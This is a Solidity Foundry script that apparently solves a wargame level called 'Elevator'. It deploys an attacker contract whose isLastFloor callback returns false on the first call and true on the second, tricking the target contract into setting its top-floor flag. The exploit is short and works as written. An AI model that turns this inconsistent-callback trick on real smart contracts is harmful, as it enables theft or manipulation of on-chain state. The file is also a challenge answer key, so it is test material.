// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackElevator is Building {
    bool public change = false;

    function isLastFloor(uint256) external override returns (bool) {
        if (change == false) {
            change = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(address _elevatorAddress) external {
        Elevator(_elevatorAddress).goTo(1);
    }
}

contract ElevatorSolution is Script {
    Elevator elevatorInstance = Elevator(payable(0x392163B00B2Ee5345dB5908D429098fbFD021719));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackElevator attacker = new AttackElevator(); // 배포
        attacker.attack(address(elevatorInstance)); // 공격
        vm.stopBroadcast();
    }
}